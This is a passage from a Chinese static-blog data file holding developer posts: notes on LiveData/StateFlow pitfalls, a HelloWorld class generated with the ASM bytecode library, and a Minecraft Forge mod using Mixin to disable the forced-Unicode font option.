StateFlow发送Events</h2><p>LiveData和StateFlow被设计来保存一个状态，单从这个角度来说，它们设计得非常到位，完美的符合我们的需求。但如果我们的需求不是保存一个状态，而只是希望它在收到一个值时能够通知观察者，也许它们就不太适合了。</p>\n<p>LiveData在设计时被赋予了数据倒灌的特性，回到界面时会再次通知一次观察者，事件应该是具有时效性的，这样与我们的需求不符。</p>\n<p>LiveData和StateFlow都会产生丢值的问题，因为LiveData和StateFlow设计的时候都只考虑了保留一个值的情况，所以对他们而言，最新的值才是最重要的，已经过期的值就没有必要通知，减少下游的处理逻辑，节省性能，所以这并不是bug，而是一种特性。StateFlow还会忽略重复发送的相同的值，这个特性被称为<strong>防抖</strong>。</p>\n<h2 id=\"其五-在Repository层中使用LiveData\"><a href=\"#其五-在Repository层中使用LiveData\" class=\"headerlink\" title=\"其五 在Repository层中使用LiveData\"></a>其五 在Repository层中使用LiveData</h2><p>我们应该经常在仓库层使用RxJava或者Flow，但其实很少见到说在仓库层使用LiveData，在我印象中这三者应该至少是比较类似的东西，那么为什么LiveData不行呢？有两点点原因:</p>\n<ul>\n<li>重度依赖lifecycle，仓库层获取不到lifecycleOwner，只能使用observeForever这种可能造成内存泄漏的方法来进行</li>\n<li>不支持线程切换 故所有操作符实际上默认都是在主线程上运行</li>\n</ul>\n<h2 id=\"其六-ViewModel接口暴露不合理\"><a href=\"#其六-ViewModel接口暴露不合理\" class=\"headerlink\" title=\"其六 ViewModel接口暴露不合理\"></a>其六 ViewModel接口暴露不合理</h2><ul>\n<li>暴露Mutable状态</li>\n<li>暴露suspend方法</li>\n</ul>\n"},{"title":"用ASM写一个HelloWorld","date":"2021-10-11T03:46:08.000Z","author":"寒雨","hide":false,"summary":"尝试了一下asm库，用它生成了一个helloworld的代码","_content":"\n# 用ASM写一个HelloWorld\n\n今天上计算机应用能力课的时候太无聊，简单的研究了一下ASM，用ASM生成了一个含有HelloWorld的类\n不得不说，ASM是真的黑魔法\n\n## 代码\n\n```kotlin\npublic class ASMTest {\n\n    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {\n        byte[] bytes = generate();\n        MyClassLoader cl = new MyClassLoader();\n        Class<?> clazz = cl.defineClass(\"team.redrock.coldrain.asmtest.HelloWorldASM\", bytes);\n        Method m = clazz.getMethod(\"main\", String[].class);\n        m.invoke(null, new Object[]{new String[]{}});\n    }\n\n    static byte[] generate() {\n        ClassWriter cw = new ClassWriter(0);\n        cw.visit(Opcodes.V1_8, Opcodes.ACC_PUBLIC, \"team/redrock/coldrain/asmtest/HelloWorldASM\", null, \"java/lang/Object\", null);\n        MethodVisitor mv = cw.visitMethod(Opcodes.ACC_PUBLIC + Opcodes.ACC_STATIC, \"main\", \"([Ljava/lang/String;)V\", null, null);\n        mv.visitFieldInsn(Opcodes.GETSTATIC, \"java/lang/System\", \"out\", \"Ljava/io/PrintStream;\");\n        mv.visitLdcInsn(\"Hello ASM!\");\n        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, \"java/io/PrintStream\", \"println\", \"(Ljava/lang/String;)V\", false);\n        mv.visitInsn(Opcodes.RETURN);\n        mv.visitMaxs(2, 1);\n        mv.visitEnd();\n        cw.visitEnd();\n        return cw.toByteArray();\n    }\n\n    static class MyClassLoader extends ClassLoader {\n        public Class<?> defineClass(String name, byte[] b) {\n            return super.defineClass(name, b, 0, b.length);\n        }\n    }\n}\n```","source":"_posts/hello-asm.md","raw":"---\ntitle: 用ASM写一个HelloWorld\ndate: 2021-10-11 11:46:08\nauthor: 寒雨\nhide: false\nsummary: 尝试了一下asm库，用它生成了一个helloworld的代码\ncategories: 笔记\ntags:\n  - 外部库\n  - ASM\n  - Java\n---\n\n# 用ASM写一个HelloWorld\n\n今天上计算机应用能力课的时候太无聊，简单的研究了一下ASM，用ASM生成了一个含有HelloWorld的类\n不得不说，ASM是真的黑魔法\n\n## 代码\n\n```kotlin\npublic class ASMTest {\n\n    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {\n        byte[] bytes = generate();\n        MyClassLoader cl = new MyClassLoader();\n        Class<?> clazz = cl.defineClass(\"team.redrock.coldrain.asmtest.HelloWorldASM\", bytes);\n        Method m = clazz.getMethod(\"main\", String[].class);\n        m.invoke(null, new Object[]{new String[]{}});\n    }\n\n    static byte[] generate() {\n        ClassWriter cw = new ClassWriter(0);\n        cw.visit(Opcodes.V1_8, Opcodes.ACC_PUBLIC, \"team/redrock/coldrain/asmtest/HelloWorldASM\", null, \"java/lang/Object\", null);\n        MethodVisitor mv = cw.visitMethod(Opcodes.ACC_PUBLIC + Opcodes.ACC_STATIC, \"main\", \"([Ljava/lang/String;)V\", null, null);\n        mv.visitFieldInsn(Opcodes.GETSTATIC, \"java/lang/System\", \"out\", \"Ljava/io/PrintStream;\");\n        mv.visitLdcInsn(\"Hello ASM!\");\n        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, \"java/io/PrintStream\", \"println\", \"(Ljava/lang/String;)V\", false);\n        mv.visitInsn(Opcodes.RETURN);\n        mv.visitMaxs(2, 1);\n        mv.visitEnd();\n        cw.visitEnd();\n        return cw.toByteArray();\n    }\n\n    static class MyClassLoader extends ClassLoader {\n        public Class<?> defineClass(String name, byte[] b) {\n            return super.defineClass(name, b, 0, b.length);\n        }\n    }\n}\n```","slug":"hello-asm","published":1,"updated":"2021-11-13T16:17:09.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jtg0012sfkl32lr2xt5","content":"<h1 id=\"用ASM写一个HelloWorld\"><a href=\"#用ASM写一个HelloWorld\" class=\"headerlink\" title=\"用ASM写一个HelloWorld\"></a>用ASM写一个HelloWorld</h1><p>今天上计算机应用能力课的时候太无聊，简单的研究了一下ASM，用ASM生成了一个含有HelloWorld的类<br>不得不说，ASM是真的黑魔法</p>\n<h2 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h2><pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> ASMTest <span class=\"token punctuation\">{</span>\n\n    <span class=\"token keyword\">public</span> static void <span class=\"token function\">main</span><span class=\"token punctuation\">(</span>String<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> throws NoSuchMethodException<span class=\"token punctuation\">,</span> InvocationTargetException<span class=\"token punctuation\">,</span> IllegalAccessException <span class=\"token punctuation\">{</span>\n        byte<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> bytes <span class=\"token operator\">=</span> <span class=\"token function\">generate</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        MyClassLoader cl <span class=\"token operator\">=</span> new <span class=\"token function\">MyClassLoader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        Class<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span> clazz <span class=\"token operator\">=</span> cl<span class=\"token punctuation\">.</span><span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"team.redrock.coldrain.asmtest.HelloWorldASM\"</span><span class=\"token punctuation\">,</span> bytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        Method m <span class=\"token operator\">=</span> clazz<span class=\"token punctuation\">.</span><span class=\"token function\">getMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"main\"</span><span class=\"token punctuation\">,</span> String<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>class<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        m<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> new Object<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">{</span>new String<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    static byte<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token function\">generate</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        ClassWriter cw <span class=\"token operator\">=</span> new <span class=\"token function\">ClassWriter</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        cw<span class=\"token punctuation\">.</span><span class=\"token function\">visit</span><span class=\"token punctuation\">(</span>Opcodes<span class=\"token punctuation\">.</span>V1_8<span class=\"token punctuation\">,</span> Opcodes<span class=\"token punctuation\">.</span>ACC_PUBLIC<span class=\"token punctuation\">,</span> <span class=\"token string\">\"team/redrock/coldrain/asmtest/HelloWorldASM\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"java/lang/Object\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        MethodVisitor mv <span class=\"token operator\">=</span> cw<span class=\"token punctuation\">.</span><span class=\"token function\">visitMethod</span><span class=\"token punctuation\">(</span>Opcodes<span class=\"token punctuation\">.</span>ACC_PUBLIC <span class=\"token operator\">+</span> Opcodes<span class=\"token punctuation\">.</span>ACC_STATIC<span class=\"token punctuation\">,</span> <span class=\"token string\">\"main\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"([Ljava/lang/String;)V\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitFieldInsn</span><span class=\"token punctuation\">(</span>Opcodes<span class=\"token punctuation\">.</span>GETSTATIC<span class=\"token punctuation\">,</span> <span class=\"token string\">\"java/lang/System\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"out\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Ljava/io/PrintStream;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitLdcInsn</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello ASM!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitMethodInsn</span><span class=\"token punctuation\">(</span>Opcodes<span class=\"token punctuation\">.</span>INVOKEVIRTUAL<span class=\"token punctuation\">,</span> <span class=\"token string\">\"java/io/PrintStream\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"println\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"(Ljava/lang/String;)V\"</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitInsn</span><span class=\"token punctuation\">(</span>Opcodes<span class=\"token punctuation\">.</span>RETURN<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitMaxs</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitEnd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        cw<span class=\"token punctuation\">.</span><span class=\"token function\">visitEnd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> cw<span class=\"token punctuation\">.</span><span class=\"token function\">toByteArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    static <span class=\"token keyword\">class</span> MyClassLoader extends ClassLoader <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">public</span> Class<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span> <span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span>String name<span class=\"token punctuation\">,</span> byte<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> b<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">return</span> <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":"前去拜访"},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go💕","url":"https://blog.stellaris.wang/","title":"前去拜访"}]}},"excerpt":"","more":"<h1 id=\"用ASM写一个HelloWorld\"><a href=\"#用ASM写一个HelloWorld\" class=\"headerlink\" title=\"用ASM写一个HelloWorld\"></a>用ASM写一个HelloWorld</h1><p>今天上计算机应用能力课的时候太无聊，简单的研究了一下ASM，用ASM生成了一个含有HelloWorld的类<br>不得不说，ASM是真的黑魔法</p>\n<h2 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h2><pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> ASMTest <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token keyword\">public</span> static void <span class=\"token function\">main</span><span class=\"token punctuation\">(</span>String<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> throws NoSuchMethodException<span class=\"token punctuation\">,</span> InvocationTargetException<span class=\"token punctuation\">,</span> IllegalAccessException <span class=\"token punctuation\">&#123;</span>\n        byte<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> bytes <span class=\"token operator\">=</span> <span class=\"token function\">generate</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        MyClassLoader cl <span class=\"token operator\">=</span> new <span class=\"token function\">MyClassLoader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        Class<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span><span class=\"token operator\">></span> clazz <span class=\"token operator\">=</span> cl<span class=\"token punctuation\">.</span><span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"team.redrock.coldrain.asmtest.HelloWorldASM\"</span><span class=\"token punctuation\">,</span> bytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        Method m <span class=\"token operator\">=</span> clazz<span class=\"token punctuation\">.</span><span class=\"token function\">getMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"main\"</span><span class=\"token punctuation\">,</span> String<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>class<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        m<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> new Object<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span>new String<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    static byte<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token function\">generate</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        ClassWriter cw <span class=\"token operator\">=</span> new <span class=\"token function\">ClassWriter</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        cw<span class=\"token punctuation\">.</span><span class=\"token function\">visit</span><span class=\"token punctuation\">(</span>Opcodes<span class=\"token punctuation\">.</span>V1_8<span class=\"token punctuation\">,</span> Opcodes<span class=\"token punctuation\">.</span>ACC_PUBLIC<span class=\"token punctuation\">,</span> <span class=\"token string\">\"team/redrock/coldrain/asmtest/HelloWorldASM\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"java/lang/Object\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        MethodVisitor mv <span class=\"token operator\">=</span> cw<span class=\"token punctuation\">.</span><span class=\"token function\">visitMethod</span><span class=\"token punctuation\">(</span>Opcodes<span class=\"token punctuation\">.</span>ACC_PUBLIC <span class=\"token operator\">+</span> Opcodes<span class=\"token punctuation\">.</span>ACC_STATIC<span class=\"token punctuation\">,</span> <span class=\"token string\">\"main\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"([Ljava/lang/String;)V\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitFieldInsn</span><span class=\"token punctuation\">(</span>Opcodes<span class=\"token punctuation\">.</span>GETSTATIC<span class=\"token punctuation\">,</span> <span class=\"token string\">\"java/lang/System\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"out\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Ljava/io/PrintStream;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitLdcInsn</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello ASM!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitMethodInsn</span><span class=\"token punctuation\">(</span>Opcodes<span class=\"token punctuation\">.</span>INVOKEVIRTUAL<span class=\"token punctuation\">,</span> <span class=\"token string\">\"java/io/PrintStream\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"println\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"(Ljava/lang/String;)V\"</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitInsn</span><span class=\"token punctuation\">(</span>Opcodes<span class=\"token punctuation\">.</span>RETURN<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitMaxs</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitEnd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        cw<span class=\"token punctuation\">.</span><span class=\"token function\">visitEnd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> cw<span class=\"token punctuation\">.</span><span class=\"token function\">toByteArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    static <span class=\"token keyword\">class</span> MyClassLoader extends ClassLoader <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">public</span> Class<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span><span class=\"token operator\">></span> <span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span>String name<span class=\"token punctuation\">,</span> byte<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> b<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>"},{"title":"Hello Minecraft Forge & Mixin!","date":"2021-12-29T16:00:00.000Z","author":"寒雨","hide":false,"summary":"开发了自己的第一个Forge Mod,并且初步了解了Mixin这一极其实用的字节码操作框架","_content":"\n# Hello Minecraft Forge & Mixin!\n\n> 起因经过大概是斯帕克那边需要一个模组来禁止玩家开启 强制使用Unicode字体 这一选项来确保材质包的体验效果\n>\n> 行吧，以前虽然完全没有了解过Forge开发，还是只有硬着头皮上了呗\n\n## Forge环境搭建\n\n> 老大难了，Forge Mod的开发者之所以明显少于Bukkit插件开发者也许就是因为这位拦路虎吧\n>\n> 不仅难，社区的有关教程也特别少 （我知道有很多1.12的环境搭建教程，但1.16版本的forge教程简直是一片荒原\n>\n> 而由于网络原因（众所周知），老外的那套官方教程很多地方对我们不适用\n>\n> 庆幸我最开始学习的是Bukkit开发，如果当时我选择学习forge mod开发，多半会倒在环境搭建这座大山前\n\n最开始我试图使用forge官方提供的ForgeGradle mdk快速完成开发环境的搭建，最后我发现即使我能够科学上网，有的东西gradle一样拉不下来\n\n怎么办？于是我上mcbbs寻求帮助，发现了耗子大佬的[[1.17.1-1.7.10\\] Minecraft模组开发离线包 [Forge|Fabric] - 编程开发 - Minecraft(我的世界)中文论坛 - (mcbbs.net)](https://www.mcbbs.net/thread-896542-1-1.html)于是我下载并部署了耗子大佬的gradle依赖离线包。\n\n到这里我便具备了一个Forge开发者的基本开发环境\n\n但如果仅仅到这里就结束，我也不会说他难了\n\n真正的重头戏，还在后头\n\n## Mixin环境搭建\n\n> Mixin是SpongePowered开发的一套基于javaagent和asm框架的字节码操作框架，有了Mixin，开发者可以摆脱繁琐的传统字节码插桩操作，以一种非常简洁直观的方式修改Minecraft客户端的底层逻辑代码\n>\n> 而不同于Bukkit API竭力阻止开发者利用服务端原生特性，主张一切插件应该完全在Bukkit API的基础上实现\n>\n> Forge API的设计是完全信任开发者的，鼓励开发者修改客户端底层逻辑代码来实现自己想要的特性，甚至Forge准确来说不能被称为一种API，而是模组开发者与客户端底层代码的一层兼容层。\n>\n> 所以说，Forge和Mixin可谓是天作之合，从Forge1.16版本开始，Forge开始原生附带Mixin环境\n>\n> 而这一切，得益于Mojang官方公布了客户端的混淆表。Minecraft作为一款商业游戏，公布混淆表无疑是一种巨大的牺牲。但我相信，正是这个英明的决策，刺激了广大模组开发者的开发热情，让各色Minecraft模组在社区中遍地生根，让Minecraft成为如此一款伟大的游戏。\n>\n> 所以在Forge开发中，我们看到的大部分客户端底层代码都是具有相当程度的可读性的。\n>\n> 而使用Mixin，可以让我们以最高效的方式修改底层代码，实现一些以前在做Bukkit开发时连想都不敢想的魔法般的特性\n>\n> 那么Mixin的环境搭建，上面我说的重头戏\n\n最开始我以为Mixin是不需要配置，开箱即用的。结果把编译出来的模组跑了一遍又一遍，发现Mixin没有起任何作用\n\n我尝试在网络上搜索Mixin环境搭建教程，却发现除了耗子大佬的[[未知之域\\][翻译]Mixin官方文档翻译——深度修改Minecraft的利器 - 编程开发 - Minecraft(我的世界)中文论坛 - (mcbbs.net)](https://www.mcbbs.net/thread-833646-1-1.html)，一篇有价值的文章也找不出来。\n\n我在耗子大佬的官方文档翻译中学习了Mixin的使用方法，但它并没有详细的告诉我如何搭建环境。\n\n于是我想起来，坏黑曾经写过一个1.16的Forge Mod，我是不是可以参考他的源码来招猫画虎呢\n\n同时我也想起来海螺的博客似乎也提到过这玩意，然后在这上面找到了官方的release note\n\n[关于 Mixin 升级到 0.8 和 ModLauncher 的那些事 | IzzelAliz's Blog](https://izzel.io/2020/02/06/mixin-0-8-guide/)\n\n[Release Notes Mixin 0.8 · SpongePowered/Mixin Wiki (github.com)](https://github.com/SpongePowered/Mixin/wiki/Release-Notes---Mixin-0.8)\n\n于是依靠上面这些，我基本搭建起了一个Mixin环境\n\n> 难点基本如下\n>\n> 1.MixinConnector\n>\n> 2.MixinRefmap文件\n>\n> 3.MixinAnnoationProcessor\n>\n> 4.Mixin配置文件\n>\n> 额外需要注意的是，Mixin配置文件中指定的Mixin Pakage不能指定位模组主类所在包，这样会导致模组无法加载\n\n虽然有些晚了，但我还是把问题解决之后找到的相关资料放在这里\n\n[mouse0w0/forge-mixin-example: An example for using Mixin in Minecraft Forge 1.12.2 (github.com)](https://github.com/mouse0w0/forge-mixin-example)\n\n## 功能实现\n\n毕竟也不是教程，杂谈而已，就不写使用教程了\n\n这里只放出实现功能的Mixin代码\n\n### 我的做法\n\n锁掉底层选项实际boolean值，使玩家不论如何更改选项都以非强制Unicode字体方式渲染字体\n\n~~~java\n\npackage me.asgard.rain.afu.mixin;\n\nimport com.google.common.collect.ImmutableMap;\nimport net.minecraft.client.Minecraft;\nimport net.minecraft.client.gui.fonts.FontResourceManager;\nimport org.spongepowered.asm.mixin.Final;\nimport org.spongepowered.asm.mixin.Mixin;\nimport org.spongepowered.asm.mixin.Overwrite;\nimport org.spongepowered.asm.mixin.Shadow;\n\nimport java.io.IOException;\n\n/**\n * me.asgard.rain.afu.GameSettingMixin\n * AntiForceUnicode\n *\n * @author 寒雨\n * @since 2021/12/29 13:48\n **/\n@Mixin(Minecraft.class)\npublic abstract class MinecraftMixin {\n\n    @Final\n    @Shadow\n    private FontResourceManager fontManager;\n\n    /**\n     * @author Rain\n     * @reason force disable force unicode\n     */\n    @Overwrite\n    public boolean isEnforceUnicode() {\n        return false;\n    }\n\n    /**\n     * @author Rain\n     * @reason force disable force unicode\n     */\n    @Overwrite\n    public void selectMainFont(boolean p_238209_1_) {\n        fontManager.setRenames(ImmutableMap.of());\n    }\n}\n~~~\n\n### 坏黑的做法\n\n写成一天后坏黑大概是来兴趣了，也写了一个\n\n他直接把那个选项的按钮删掉了。毫无疑问，这个做法更好\n\n~~~java\npackage me.skymc.fsb.mixin;\n\nimport net.minecraft.client.AbstractOption;\nimport net.minecraft.client.gui.screen.Screen;\nimport net.minecraft.client.gui.widget.Widget;\nimport net.minecraft.client.gui.widget.button.OptionButton;\nimport org.spongepowered.asm.mixin.Mixin;\nimport org.spongepowered.asm.mixin.injection.At;\nimport org.spongepowered.asm.mixin.injection.Inject;\nimport org.spongepowered.asm.mixin.injection.callback.CallbackInfoReturnable;\n\n/**\n * FSB\n * me.skymc.fsb.mixin.MixinScreenLanguage\n *\n * @author 坏黑\n * @since 2021/12/29 10:54 PM\n */\n@Mixin(Screen.class)\npublic abstract class MixinLanguageScreen {\n\n    @Inject(method = \"addButton\", at = @At(value = \"HEAD\"), cancellable = true)\n    protected <T extends Widget> void addButton(T p_230480_1_, CallbackInfoReturnable<T> c) {\n        if (p_230480_1_ instanceof OptionButton && ((OptionButton) p_230480_1_).getOption() == AbstractOption.FORCE_UNICODE_FONT) {\n            c.setReturnValue(p_230480_1_);\n        }\n    }\n}\n~~~","source":"_posts/hello-forge-and-mixin.md","raw":"---\ntitle: Hello Minecraft Forge & Mixin!\ndate: 2021-12-30\nauthor: 寒雨\nhide: false\nsummary: 开发了自己的第一个Forge Mod,并且初步了解了Mixin这一极其实用的字节码操作框架\ncategories: 杂谈\ntags:\n  - Minecraft\n  - Forge模组开发\n  - 字节码操作\n  - Mixin \n---\n\n# Hello Minecraft Forge & Mixin!\n\n> 起因经过大概是斯帕克那边需要一个模组来禁止玩家开启 强制使用Unicode字体 这一选项来确保材质包的体验效果\n>\n> 行吧，以前虽然完全没有了解过Forge开发，还是只有硬着头皮上了呗\n\n## Forge环境搭建\n\n> 老大难了，Forge Mod的开发者之所以明显少于Bukkit插件开发者也许就是因为这位拦路虎吧\n>\n> 不仅难，社区的有关教程也特别少 